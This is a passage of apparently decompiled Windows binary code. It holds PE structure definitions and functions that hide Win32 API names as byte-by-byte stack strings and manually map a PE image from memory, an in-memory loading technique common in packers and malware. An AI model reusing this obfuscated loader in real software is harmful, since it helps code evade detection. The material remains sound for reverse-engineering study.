typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _cpinfo _cpinfo, *P_cpinfo;

typedef uint UINT;

typedef uchar BYTE;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ulong DWORD;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef WCHAR *LPWSTR;

typedef WCHAR *LPWCH;

typedef WCHAR *LPCWSTR;

typedef CHAR *LPCSTR;

typedef CHAR *LPCH;

typedef struct _OSVERSIONINFOA _OSVERSIONINFOA, *P_OSVERSIONINFOA;

struct _OSVERSIONINFOA {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    CHAR szCSDVersion[128];
};

typedef struct _OSVERSIONINFOA *LPOSVERSIONINFOA;

typedef CONTEXT *PCONTEXT;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR SIZE_T;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

struct HINSTANCE__ {
    int unused;
};

typedef void *LPVOID;

typedef HINSTANCE HMODULE;

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef int BOOL;

typedef BOOL *LPBOOL;

typedef void *LPCVOID;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};




FARPROC __cdecl FUN_0045a8c0(HMODULE param_1,LPCSTR param_2,LPCSTR param_3)

{
  HMODULE hModule;
  FARPROC pFVar1;
  CHAR *lpProcName;
  CHAR local_24;
  undefined local_23;
  undefined local_22;
  undefined local_21;
  undefined local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  CHAR local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  undefined local_8;
  
  local_18 = 0;
  local_8 = 0;
  lpProcName = &local_14;
  local_24 = 'K';
  local_23 = 0x45;
  local_22 = 0x52;
  local_21 = 0x4e;
  local_20 = 0x45;
  local_1f = 0x4c;
  local_1e = 0x33;
  local_1d = 0x32;
  local_1c = 0x2e;
  local_1b = 100;
  local_1a = 0x6c;
  local_19 = 0x6c;
  local_14 = 'L';
  local_13 = 0x6f;
  local_12 = 0x61;
  local_11 = 100;
  local_10 = 0x4c;
  local_f = 0x69;
  local_e = 0x62;
  local_d = 0x72;
  local_c = 0x61;
  local_b = 0x72;
  local_a = 0x79;
  local_9 = 0x41;
  hModule = GetModuleHandleA(&local_24);
  pFVar1 = GetProcAddress(hModule,lpProcName);
  if (((param_1 == (HMODULE)0x0) && (param_1 = GetModuleHandleA(param_2), param_1 == (HMODULE)0x0))
     && (param_1 = (HMODULE)(*pFVar1)(param_2), param_1 == (HMODULE)0x0)) {
    pFVar1 = (FARPROC)0x0;
  }
  else {
    pFVar1 = GetProcAddress(param_1,param_3);
  }
  return pFVar1;
}



void __cdecl FUN_0045a97b(int param_1,undefined4 param_2)

{
  FARPROC pFVar1;
  FARPROC pFVar2;
  int iVar3;
  CHAR local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  CHAR local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  CHAR local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  CHAR local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  FARPROC local_8;
  
  local_30 = 'K';
  local_2f = 0x45;
  local_2e = 0x52;
  local_2d = 0x4e;
  local_2c = 0x45;
  local_2b = 0x4c;
  local_2a = 0x33;
  local_29 = 0x32;
  local_28 = 0x2e;
  local_27 = 100;
  local_26 = 0x6c;
  local_25 = 0x6c;
  local_24 = 0;
  local_40 = 'G';
  local_3f = 0x65;
  local_3e = 0x74;
  local_3d = 0x50;
  local_3c = 0x72;
  local_3b = 0x6f;
  local_3a = 99;
  local_39 = 0x65;
  local_38 = 0x73;
  local_37 = 0x73;
  local_36 = 0x48;
  local_35 = 0x65;
  local_34 = 0x61;
  local_33 = 0x70;
  local_32 = 0;
  pFVar1 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_40);
  local_20 = 'H';
  local_1f = 0x65;
  local_1e = 0x61;
  local_1d = 0x70;
  local_1c = 0x52;
  local_1b = 0x65;
  local_1a = 0x41;
  local_19 = 0x6c;
  local_18 = 0x6c;
  local_17 = 0x6f;
  local_16 = 99;
  local_15 = 0;
  pFVar2 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_20);
  local_14 = 'H';
  local_13 = 0x65;
  local_12 = 0x61;
  local_11 = 0x70;
  local_10 = 0x41;
  local_f = 0x6c;
  local_e = 0x6c;
  local_d = 0x6f;
  local_c = 99;
  local_b = 0;
  local_8 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_14);
  if (param_1 == 0) {
    iVar3 = (*pFVar1)(0,param_2);
    (*local_8)(iVar3);
  }
  else {
    iVar3 = (*pFVar1)(0,param_1);
    (*pFVar2)(iVar3);
  }
  return;
}



void __cdecl FUN_0045aa9d(undefined4 param_1)

{
  FARPROC pFVar1;
  FARPROC pFVar2;
  int iVar3;
  CHAR local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  undefined local_23;
  undefined local_22;
  CHAR local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  CHAR local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  undefined local_c;
  undefined local_b;
  undefined local_a;
  undefined local_9;
  undefined local_8;
  
  local_20 = 'K';
  local_1f = 0x45;
  local_1e = 0x52;
  local_1d = 0x4e;
  local_1c = 0x45;
  local_1b = 0x4c;
  local_1a = 0x33;
  local_19 = 0x32;
  local_18 = 0x2e;
  local_17 = 100;
  local_16 = 0x6c;
  local_15 = 0x6c;
  local_14 = 0;
  local_30 = 'G';
  local_2f = 0x65;
  local_2e = 0x74;
  local_2d = 0x50;
  local_2c = 0x72;
  local_2b = 0x6f;
  local_2a = 99;
  local_29 = 0x65;
  local_28 = 0x73;
  local_27 = 0x73;
  local_26 = 0x48;
  local_25 = 0x65;
  local_24 = 0x61;
  local_23 = 0x70;
  local_22 = 0;
  pFVar1 = FUN_0045a8c0((HMODULE)0x0,&local_20,&local_30);
  local_10 = 'H';
  local_f = 0x65;
  local_e = 0x61;
  local_d = 0x70;
  local_c = 0x46;
  local_b = 0x72;
  local_a = 0x65;
  local_9 = 0x65;
  local_8 = 0;
  pFVar2 = FUN_0045a8c0((HMODULE)0x0,&local_20,&local_10);
  iVar3 = (*pFVar1)(0,param_1);
  (*pFVar2)(iVar3);
  return;
}



FARPROC * __cdecl FUN_0045ab6a(undefined4 *param_1)

{
  int iVar1;
  FARPROC *ppFVar2;
  FARPROC pFVar3;
  int iVar4;
  undefined4 *puVar5;
  uint uVar6;
  int *piVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  CHAR local_50;
  undefined local_4f;
  undefined local_4e;
  undefined local_4d;
  undefined local_4c;
  undefined local_4b;
  undefined local_4a;
  undefined local_49;
  undefined local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  CHAR local_40;
  undefined local_3f;
  undefined local_3e;
  undefined local_3d;
  undefined local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  CHAR local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  CHAR local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  FARPROC *local_14;
  FARPROC local_10;
  FARPROC local_c;
  FARPROC local_8;
  
  local_24 = 0;
  local_34 = 0;
  local_30 = 'K';
  local_2f = 0x45;
  local_2e = 0x52;
  local_2d = 0x4e;
  local_2c = 0x45;
  local_2b = 0x4c;
  local_2a = 0x33;
  local_29 = 0x32;
  local_28 = 0x2e;
  local_27 = 100;
  local_26 = 0x6c;
  local_25 = 0x6c;
  local_40 = 'V';
  local_3f = 0x69;
  local_3e = 0x72;
  local_3d = 0x74;
  local_3c = 0x75;
  local_3b = 0x61;
  local_3a = 0x6c;
  local_39 = 0x41;
  local_38 = 0x6c;
  local_37 = 0x6c;
  local_36 = 0x6f;
  local_35 = 99;
  local_8 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_40);
  local_42 = 0;
  local_50 = 'G';
  local_4f = 0x65;
  local_4e = 0x74;
  local_4d = 0x50;
  local_4c = 0x72;
  local_4b = 0x6f;
  local_4a = 99;
  local_49 = 0x65;
  local_48 = 0x73;
  local_47 = 0x73;
  local_46 = 0x48;
  local_45 = 0x65;
  local_44 = 0x61;
  local_43 = 0x70;
  local_10 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_50);
  local_17 = 0;
  local_20 = 'H';
  local_1f = 0x65;
  local_1e = 0x61;
  local_1d = 0x70;
  local_1c = 0x41;
  local_1b = 0x6c;
  local_1a = 0x6c;
  local_19 = 0x6f;
  local_18 = 99;
  local_14 = (FARPROC *)FUN_0045a8c0((HMODULE)0x0,&local_30,&local_20);
  if (((*(short *)param_1 == 0x5a4d) &&
      (piVar7 = (int *)((int)param_1 + param_1[0xf]), *piVar7 == 0x4550)) &&
     ((local_c = (FARPROC)(*local_8)(piVar7[0xd],piVar7[0x14],0x2000,4), local_c != (FARPROC)0x0 ||
      (local_c = (FARPROC)(*local_8)(0,piVar7[0x14],0x2000,4), local_c != (FARPROC)0x0)))) {
    iVar4 = (*local_10)(0,0x14);
    local_14 = (FARPROC *)(*(code *)local_14)(iVar4);
    local_14[3] = (FARPROC)0x0;
    local_14[2] = (FARPROC)0x0;
    local_14[4] = (FARPROC)0x0;
    local_14[1] = local_c;
    (*local_8)(local_c,piVar7[0x14],0x1000,4);
    puVar5 = (undefined4 *)(*local_8)(local_c,piVar7[0x15],0x1000,4);
    pFVar3 = local_c;
    ppFVar2 = local_14;
    iVar4 = piVar7[0x15];
    iVar1 = param_1[0xf];
    puVar8 = param_1;
    puVar9 = puVar5;
    for (uVar6 = (uint)(iVar4 + iVar1) >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
      *puVar9 = *puVar8;
      puVar8 = puVar8 + 1;
      puVar9 = puVar9 + 1;
    }
    for (uVar6 = iVar4 + iVar1 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
      *(undefined *)puVar9 = *(undefined *)puVar8;
      puVar8 = (undefined4 *)((int)puVar8 + 1);
      puVar9 = (undefined4 *)((int)puVar9 + 1);
    }
    iVar4 = param_1[0xf];
    *local_14 = (FARPROC)((int)puVar5 + iVar4);
    *(FARPROC *)((FARPROC)((int)puVar5 + iVar4) + 0x34) = local_c;
    FUN_0045ad84((int)param_1,(int)piVar7,(int *)local_14);
    if ((int)pFVar3 - piVar7[0xd] != 0) {
      FUN_0045b03d((int *)ppFVar2,(int)pFVar3 - piVar7[0xd]);
    }
    iVar4 = FUN_0045b0b7(ppFVar2);
    if (iVar4 != 0) {
      FUN_0045aeb1((int *)ppFVar2);
      if (*(int *)(*ppFVar2 + 0x28) == 0) {
        return ppFVar2;
      }
      if ((pFVar3 + *(int *)(*ppFVar2 + 0x28) != (FARPROC)0x0) &&
         (iVar4 = (*(pFVar3 + *(int *)(*ppFVar2 + 0x28)))(pFVar3,1,0), iVar4 != 0)) {
        ppFVar2[4] = (FARPROC)0x1;
        return ppFVar2;
      }
    }
    FUN_0045b32f((int *)ppFVar2);
  }
  return (FARPROC *)0x0;
}



void __cdecl FUN_0045ad84(int param_1,int param_2,int *param_3)

{
  uint *puVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  uint uVar5;
  uint uVar6;
  uint *puVar7;
  undefined4 *puVar8;
  CHAR local_30;
  undefined local_2f;
  undefined local_2e;
  undefined local_2d;
  undefined local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
  undefined local_26;
  undefined local_25;
  undefined local_24;
  CHAR local_20;
  undefined local_1f;
  undefined local_1e;
  undefined local_1d;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  FARPROC local_10;
  int local_c;
  int local_8;
  
  local_24 = 0;
  local_14 = 0;
  local_30 = 'K';
  local_2f = 0x45;
  local_2e = 0x52;
  local_2d = 0x4e;
  local_2c = 0x45;
  local_2b = 0x4c;
  local_2a = 0x33;
  local_29 = 0x32;
  local_28 = 0x2e;
  local_27 = 100;
  local_26 = 0x6c;
  local_25 = 0x6c;
  local_20 = 'V';
  local_1f = 0x69;
  local_1e = 0x72;
  local_1d = 0x74;
  local_1c = 0x75;
  local_1b = 0x61;
  local_1a = 0x6c;
  local_19 = 0x41;
  local_18 = 0x6c;
  local_17 = 0x6c;
  local_16 = 0x6f;
  local_15 = 99;
  local_10 = FUN_0045a8c0((HMODULE)0x0,&local_30,&local_20);
  local_8 = 0;
  local_c = param_3[1];
  iVar2 = *param_3;
  puVar1 = (uint *)((uint)*(ushort *)(iVar2 + 0x14) + iVar2);
  if (*(short *)(iVar2 + 6) != 0) {
    do {
      puVar7 = puVar1 + 10;
      if (*puVar7 == 0) {
        uVar6 = *(uint *)(param_2 + 0x38);
        if (0 < (int)uVar6) {
          puVar3 = (undefined4 *)(*local_10)(puVar1[9] + local_c,uVar6,0x1000,4);
          puVar1[8] = (uint)puVar3;
          for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
            *puVar3 = 0;
            puVar3 = puVar3 + 1;
          }
          for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
            *(undefined *)puVar3 = 0;
            puVar3 = (undefined4 *)((int)puVar3 + 1);
          }
        }
      }
      else {
        puVar4 = (undefined4 *)(*local_10)(puVar1[9] + local_c,*puVar7,0x1000,4);
        uVar6 = *puVar7;
        puVar3 = (undefined4 *)(puVar1[0xb] + param_1);
        puVar8 = puVar4;
        for (uVar5 = uVar6 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
          *puVar8 = *puVar3;
          puVar3 = puVar3 + 1;
          puVar8 = puVar8 + 1;
        }
        for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
          *(undefined *)puVar8 = *(undefined *)puVar3;
          puVar3 = (undefined4 *)((int)puVar3 + 1);
          puVar8 = (undefined4 *)((int)puVar8 + 1);
        }
        puVar1[8] = (uint)puVar4;
      }
      local_8 = local_8 + 1;
      puVar1 = puVar7;
    } while (local_8 < (int)(uint)*(ushort *)(*param_3 + 6));
  }
  return;
}



void __cdecl FUN_0045aeb1(int *param_1)

{
  int iVar1;
  uint uVar2;
  bool bVar3;
  CHAR local_4c;
  undefined local_4b;
  undefined local_4a;
  undefined local_49;
  undefined local_48;
  undefined local_47;
  undefined local_46;
  undefined local_45;
  undefined local_44;
  undefined local_43;
  undefined local_42;
  undefined local_41;
  undefined local_40;
  undefined local_3f;
  undefined local_3e;
  CHAR local_3c;
  undefined local_3b;
  undefined local_3a;
  undefined local_39;
  undefined local_38;
  undefined local_37;
  undefined local_36;
  undefined local_35;
  undefined local_34;
  undefined local_33;
  undefined local_32;
  undefined local_31;
  undefined local_30;
  CHAR local_2c;
  undefined local_2b;
  undefined local_2a;
  undefined local_29;
  undefined local_28;
  undefined local_27;
